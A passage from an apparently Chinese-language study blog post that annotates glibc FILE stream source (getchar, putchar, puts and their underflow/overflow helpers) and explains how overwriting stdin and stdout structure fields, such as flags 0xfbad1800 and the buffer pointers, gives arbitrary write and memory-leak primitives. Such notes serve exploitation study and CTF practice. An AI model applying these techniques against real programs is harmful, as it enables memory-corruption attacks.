class="variable">_IO_IN_BACKUP</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="variable">_IO_doallocbuf</span> (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all line buffered files before reading. */</span></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_flags</span> &amp; (<span class="variable">_IO_LINE_BUF</span>|<span class="variable">_IO_UNBUFFERED</span>))</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">      <span class="variable">_IO_flush_all_linebuffered</span> ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn't</span></span><br><span class="line"><span class="comment">	 required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">	 traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">	 not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">	 explicitly.  --drepper */</span></span><br><span class="line">      <span class="variable">_IO_acquire_lock</span> (<span class="variable">_IO_stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="variable">_IO_stdout</span>-&gt;<span class="variable">_flags</span> &amp; (<span class="variable">_IO_LINKED</span> | <span class="variable">_IO_NO_WRITES</span> | <span class="variable">_IO_LINE_BUF</span>))</span><br><span class="line">	  == (<span class="variable">_IO_LINKED</span> | <span class="variable">_IO_LINE_BUF</span>))</span><br><span class="line">	<span class="variable">_IO_OVERFLOW</span> (<span class="variable">_IO_stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      <span class="variable">_IO_release_lock</span> (<span class="variable">_IO_stdout</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">_IO_switch_to_get_mode</span> (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;<span class="variable">_IO_read_base</span> = fp-&gt;<span class="variable">_IO_read_ptr</span> = fp-&gt;<span class="variable">_IO_buf_base</span>;</span><br><span class="line">  fp-&gt;<span class="variable">_IO_read_end</span> = fp-&gt;<span class="variable">_IO_buf_base</span>;</span><br><span class="line">  fp-&gt;<span class="variable">_IO_write_base</span> = fp-&gt;<span class="variable">_IO_write_ptr</span> = fp-&gt;<span class="variable">_IO_write_end</span> <span class="comment">//都等于了_IO_buf_base</span></span><br><span class="line">    = fp-&gt;<span class="variable">_IO_buf_base</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">count</span> = <span class="variable">_IO_SYSREAD</span> (fp, fp-&gt;<span class="variable">_IO_buf_base</span>,</span><br><span class="line">		       fp-&gt;<span class="variable">_IO_buf_end</span> - fp-&gt;<span class="variable">_IO_buf_base</span>); <span class="comment">//从这里知道 _IO_buf_base是读入起始位置，_IO_buf_end是结束位置。</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">count</span> &lt;= <span class="number">0</span>) <span class="comment">//读入时出错</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">count</span> == <span class="number">0</span>)</span><br><span class="line">	fp-&gt;<span class="variable">_flags</span> |= <span class="variable">_IO_EOF_SEEN</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp-&gt;<span class="variable">_flags</span> |= <span class="variable">_IO_ERR_SEEN</span>, <span class="built_in">count</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;<span class="variable">_IO_read_end</span> += <span class="built_in">count</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">count</span> == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">	 handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">	 unset it.  */</span></span><br><span class="line">      fp-&gt;<span class="variable">_offset</span> = <span class="variable">_IO_pos_BAD</span>;</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_offset</span> != <span class="variable">_IO_pos_BAD</span>)</span><br><span class="line">    <span class="variable">_IO_pos_adjust</span> (fp-&gt;<span class="variable">_offset</span>, <span class="built_in">count</span>);</span><br><span class="line">  return *(unsigned char *) fp-&gt;<span class="variable">_IO_read_ptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>关键看这些<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  ....</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="title">if</span> (fp-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> &lt; fp-&gt;</span>_IO_read_end)<span class="comment">//需要绕过</span></span><br><span class="line">   <span class="function"><span class="title">return</span> *(unsigned char *) fp-&gt;</span>_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  ....</span><br><span class="line"><span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">read_base</span> = fp-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> = fp-&gt;</span>_IO_buf_base;</span><br><span class="line">   <span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">read_end</span> = fp-&gt;</span>_IO_buf_base;</span><br><span class="line">   <span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> = fp-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> = fp-&gt;</span>_IO_write_end <span class="comment">//都等于了_IO_buf_base</span></span><br><span class="line">   = <span class="function"><span class="title">fp</span>-&gt;</span>_IO_buf_base;</span><br><span class="line"> 	<span class="function"><span class="title">count</span> = _IO_SYSREAD (fp, fp-&gt;</span>_IO_buf_base,</span><br><span class="line">	       <span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">buf_end</span> - fp-&gt;</span>_IO_buf_base); <span class="comment">//从这里知道 _IO_buf_base是读入起始位置，_IO_buf_end是结束位置。</span></span><br><span class="line"><span class="function"><span class="title">fp</span>-&gt;</span>_IO_read_end += count;</span><br></pre></td></tr></table></figure></p>
<p>这里的_IO_SYSREAD最终会调用read，从你的键盘读入数据。且_IO_read_ptr等于了_IO_buf_base,_IO_read_end等于了_IO_buf_base+count.再次调用getchar时又可以读取正常读取缓冲区了。从这里可以知道，如果控制了_IO_buf_base，就可以造成任意写的能力。</p>
<p>总结一下：getchar函数会先判断是否已经读完了输入缓冲区（_IO_read_ptr&gt;=_IO_read_end？？？),如果输入缓冲区还没有读完，则返回_IO_read_ptr指向的一字节内容，并自增1，如果输入缓冲区已经读完了，则最终调用_IO_new_file_underflow 重新进行读取，填充缓冲区，并调整_IO_read_ptr和_IO_read_end指针的位置。</p>
<h5 id="利用手法："><a href="#利用手法：" class="headerlink" title="利用手法："></a>利用手法：</h5><p>修改stdin结构体：<br>覆盖 stdin 里的_IO_read_ptr和_IO_read_end，使_IO_read_ptr&gt;= _IO_read_end，以绕过:<br><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(unsigned <span class="built_in">char</span> *) fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure></p>
<p>然后修改_IO_buf_base为你想写入的位置，_IO_buf_end为你想写入的位置的末尾即可。</p>
<h4 id="putchar："><a href="#putchar：" class="headerlink" title="putchar："></a>putchar：</h4><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span></span><br><span class="line">putchar (<span class="built_in">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> <span class="literal">result</span>;</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line">  <span class="literal">result</span> = _IO_putc_unlocked (c, _IO_stdout);</span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和getchar很像，调用了_IO_putc_unlocked，<br>其定义如下:<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _IO_putc_unlocked(_ch, _fp) \</span></span><br><span class="line">   <span class="function"><span class="params">(_IO_BE ((_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end, <span class="number">0</span>) <span class="string">\</span></span></span></span><br><span class="line"><span class="function"><span class="params">    ? __overflow (_fp, (unsigned char) (_ch)) <span class="string">\</span></span></span></span><br><span class="line"><span class="function"><span class="params">    : (unsigned char) (*(_fp)-&gt;_IO_write_ptr++ = (_ch)))</span></span></span><br></pre></td></tr></table></figure></p>
<p>如果_IO_write_ptr&gt;=_IO_write_end说明缓冲区已满，需要调用<strong>overflow来刷新缓冲区，将缓冲区的内容写入文件中，否者_IO_write_ptr指向的内容=ch，然后_IO_write_ptr自增1.
</strong>oveflow函数最终调用了_IO_new_file_overflow，其定义如下:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, int ch) <span class="comment">//底层输出操作，这里的输出指的是向fd指向的文件写入，如果是stdout，即是向终端输出。</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="title">if</span> (f-&gt;</span>_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span> <span class="comment">//绕过</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function"><span class="title">f</span>-&gt;</span>_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="function"><span class="title">if</span> ((f-&gt;</span>_<span class="function"><span class="title">flags</span> &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;</span>_IO_write_base == NULL)<span class="comment">//可能影响_IO_write_base,ptr的值，绕过一下</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="function"><span class="title">if</span> (f-&gt;</span>_IO_write_base == NULL)</span><br><span class="line">      	&#123;</span><br><span class="line">	         _IO_doallocbuf (f);</span><br><span class="line">	         _IO_<span class="function"><span class="title">setg</span> (f, f-&gt;</span>_IO_<span class="function"><span class="title">buf_base</span>, f-&gt;</span>_IO_<span class="function"><span class="title">buf_base</span>, f-&gt;</span>_IO_buf_base);</span><br><span class="line">      	&#125;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="function"><span class="title">size_t</span> nbackup = f-&gt;</span>_IO_<span class="function"><span class="title">read_end</span> - f-&gt;</span>_IO_read_ptr;</span><br><span class="line">	      _IO_free_backup_area (f);</span><br><span class="line">	      <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">read_base</span> -= MIN (nbackup,f-&gt;</span>_IO_<span class="function"><span class="title">read_base</span> - f-&gt;</span>_IO_buf_base);</span><br><span class="line">	      <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> = f-&gt;</span>_IO_read_base;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="title">if</span> (f-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> == f-&gt;</span>_IO_buf_end)</span><br><span class="line">	        <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">read_end</span> = f-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> = f-&gt;</span>_IO_buf_base;</span><br><span class="line"></span><br><span class="line">          <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> = f-&gt;</span>_IO_read_ptr;</span><br><span class="line">          <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> = f-&gt;</span>_IO_write_ptr;</span><br><span class="line">          <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">write_end</span> = f-&gt;</span>_IO_buf_end;</span><br><span class="line">          <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">read_base</span> = f-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> = f-&gt;</span>_IO_read_end;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="title">f</span>-&gt;</span>_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="function"><span class="title">if</span> (f-&gt;</span>_<span class="function"><span class="title">mode</span> &lt;= 0 &amp;&amp; f-&gt;</span>_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	        <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">write_end</span> = f-&gt;</span>_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="function"><span class="title">return</span> _IO_do_write (f, f-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> , f-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> - f-&gt;</span>_IO_write_base);</span><br><span class="line">  <span class="function"><span class="title">if</span> (f-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> == f-&gt;</span>_IO_buf_end ) <span class="comment">/* Buffer is really full 缓冲区满了，需要刷新缓冲区，将缓冲区内容真正写入文件中*/</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF) </span><br><span class="line">      return EOF;</span><br><span class="line">  *<span class="function"><span class="title">f</span>-&gt;</span>_IO_write_ptr++ = ch; </span><br><span class="line">  <span class="function"><span class="title">if</span> ((f-&gt;</span>_<span class="function"><span class="title">flags</span> &amp; _IO_UNBUFFERED) || ((f-&gt;</span>_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">'\n'</span>))</span><br><span class="line">    <span class="function"><span class="title">if</span> (_IO_do_write (f, f-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> , f-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> - f-&gt;</span>_IO_write_base) == EOF)</span><br><span class="line">      return EOF;</span><br><span class="line">  return (unsigned char) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果ch==EOF会调用_IO_do_write函数，如果_IO_write_ptr == _IO_buf_end ，则说明缓冲区已满，调用_IO_do_flush来刷新缓冲区.<br>其实_IO_do_flush也是调用了_IO_do_write:<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># define _IO_do_flush(_f) \</span></span><br><span class="line">  _IO_do_write<span class="function"><span class="params">(_f, (_f)-&gt;_IO_write_base,				      <span class="string">\</span></span></span></span><br><span class="line"><span class="function"><span class="params">	       (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</span></span></span><br></pre></td></tr></table></figure></p>
<p>_IO_do_write调用了new_do_write,其定义如下:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">static</span><br><span class="line">_IO_size_t</span><br><span class="line">new_do_write (_IO_FILE *fp, const char *<span class="keyword">data</span>, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="function"><span class="title">if</span> (fp-&gt;</span>_flags &amp; _IO_IS_APPENDING) </span><br><span class="line">    <span class="function"><span class="title">fp</span>-&gt;</span>_offset = _IO_pos_BAD;<span class="comment">// -1</span></span><br><span class="line">  <span class="function"><span class="title">else</span> <span class="keyword">if</span> (fp-&gt;</span>_IO_<span class="function"><span class="title">read_end</span> != fp-&gt;</span>_IO_write_base)<span class="comment">//需要绕过！！！这一步</span></span><br><span class="line">    &#123;</span><br><span class="line">      _IO_<span class="function"><span class="title">off64_t</span> new_pos = _IO_SYSSEEK (fp, fp-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> - fp-&gt;</span>_IO_read_end, <span class="number">1</span>);<span class="comment">//???不清楚原因</span></span><br><span class="line">      <span class="comment">//define SEEK_CUR 1,以目前的读写位置往后增加offset个位移量.</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	        return <span class="number">0</span>;</span><br><span class="line">      <span class="function"><span class="title">fp</span>-&gt;</span>_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, <span class="keyword">data</span>, to_do);<span class="comment">//将缓冲区的内容真正写入设备中</span></span><br><span class="line">  <span class="comment">//最终调用了write()，它完成的操作是将用户缓冲区的文件内容写入到文件中</span></span><br><span class="line">  <span class="function"><span class="title">if</span> (fp-&gt;</span>_cur_column &amp;&amp; count)</span><br><span class="line">    <span class="function"><span class="title">fp</span>-&gt;</span>_<span class="function"><span class="title">cur_column</span> = _IO_adjust_column (fp-&gt;</span>_cur_column - <span class="number">1</span>, <span class="keyword">data</span>, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_<span class="function"><span class="title">setg</span> (fp, fp-&gt;</span>_IO_<span class="function"><span class="title">buf_base</span>, fp-&gt;</span>_IO_<span class="function"><span class="title">buf_base</span>, fp-&gt;</span>_IO_buf_base);</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> = fp-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> = fp-&gt;</span>_IO_buf_base;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">write_end</span> = (fp-&gt;</span>_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (<span class="function"><span class="title">fp</span>-&gt;</span>_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? <span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">buf_base</span> : fp-&gt;</span>_O_buf_end);</span><br><span class="line">  return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>该函数最后调用了write函数，将缓冲区的内容输出到文件中。<br>最初时write_ptr = write_base , 向缓冲区写入东西时，write_ptr指针的值增大，当将缓冲区的内容写入文件中时，是从_IO_write_base指向的内容开始写入到文件，到_IO_write_ptr结束。</p>
<h5 id="利用手法：-1"><a href="#利用手法：-1" class="headerlink" title="利用手法："></a>利用手法：</h5><p>修改stdout结构体：<br>绕过一下检查:<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_NO_WRITES</span>) <span class="comment">/* SET ERROR */</span> <span class="comment">//绕过他</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;<span class="variable">_flags</span> |= <span class="variable">_IO_ERR_SEEN</span>;</span><br><span class="line">      <span class="variable">__set_errno</span> (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="keyword">if</span> ((f-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_CURRENTLY_PUTTING</span>) == <span class="number">0</span> || f-&gt;<span class="variable">_IO_write_base</span> == NULL)<span class="comment">//绕过他</span></span><br><span class="line">   ........</span><br></pre></td></tr></table></figure></p>
<p>new_do_write里也需要绕过一下:<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_IS_APPENDING</span>) </span><br><span class="line">    fp-&gt;<span class="variable">_offset</span> = <span class="variable">_IO_pos_BAD</span>;<span class="comment">// -1</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_read_end</span> != fp-&gt;<span class="variable">_IO_write_base</span>)<span class="comment">//需要绕过！！！这一步</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="variable">_IO_off64_t</span> new_pos = <span class="variable">_IO_SYSSEEK</span> (fp, fp-&gt;<span class="variable">_IO_write_base</span> - fp-&gt;<span class="variable">_IO_read_end</span>, <span class="number">1</span>);<span class="comment">//???不清楚原因</span></span><br><span class="line">      <span class="comment">//define SEEK_CUR 1,以目前的读写位置往后增加offset个位移量.</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos == <span class="variable">_IO_pos_BAD</span>)</span><br><span class="line">	        return <span class="number">0</span>;</span><br><span class="line">      fp-&gt;<span class="variable">_offset</span> = new_pos;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>不能执行else if这个分支…，可以设置flag位绕过，也可以让fp-&gt;_IO_read_end = fp-&gt;_IO_write_base<br>如果某些情况不能够控制fp-&gt;_IO_read_end = fp-&gt;_IO_write_base，则可以通过控制flags位来绕过.</p>
<hr>
<p>通解手法:<br>设置flags位绕过检查:<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">flags</span>=flags&amp;~_IO_NO_WRITES</span><br><span class="line"><span class="attr">flags</span>=flags|_IO_CURRENTLY_PUTTING</span><br><span class="line"><span class="attr">flags</span>=flags|_IO_IS_APPENDING</span><br></pre></td></tr></table></figure></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8，</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br></pre></td></tr></table></figure>
<p>flags设置完后大约是 <code>0xfbad1800</code> 前面是魔数,其实开头并不一定是0xfbad… ,只要能绕过检查即可.<br>再设置_IO_write_base为想要泄露的起始地址，_IO_write_ptr为想要泄露的结束地址即可，这样就可以达到任意读。</p>
<h4 id="puts函数："><a href="#puts函数：" class="headerlink" title="puts函数："></a>puts函数：</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line"><span class="variable">_IO_puts</span> (const char *<span class="built_in">str</span>)</span><br><span class="line">&#123;</span><br><span class="line">  int result = EOF;</span><br><span class="line">  <span class="variable">_IO_size_t</span> len = strlen (<span class="built_in">str</span>);</span><br><span class="line">  <span class="variable">_IO_acquire_lock</span> (<span class="variable">_IO_stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="variable">_IO_vtable_offset</span> (<span class="variable">_IO_stdout</span>) != <span class="number">0</span></span><br><span class="line">       || <span class="variable">_IO_fwide</span> (<span class="variable">_IO_stdout</span>, -<span class="number">1</span>) == -<span class="number">1</span>)</span><br><span class="line">      &amp;&amp; <span class="variable">_IO_sputn</span> (<span class="variable">_IO_stdout</span>, <span class="built_in">str</span>, len) == len</span><br><span class="line">      &amp;&amp; <span class="variable">_IO_putc_unlocked</span> (<span class="string">'\n'</span>, <span class="variable">_IO_stdout</span>) != EOF)</span><br><span class="line">    result = <span class="built_in">MIN</span> (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">_IO_release_lock</span> (<span class="variable">_IO_stdout</span>);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>puts函数是打印str里的内容，顺面在末尾加个\n,_IO_putc_unlocked之前已经分析过了，这里分析下_IO_sputn , _IO_sputn其实是调用了_IO_new_file_xsputn:</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">_IO_size_t</span></span><br><span class="line"><span class="variable">_IO_new_file_xsputn</span> (<span class="variable">_IO_FILE</span> *f, const void *data, <span class="variable">_IO_size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  const char *s = (const char *) data;</span><br><span class="line">  <span class="variable">_IO_size_t</span> to_do = n;</span><br><span class="line">  int must_flush = 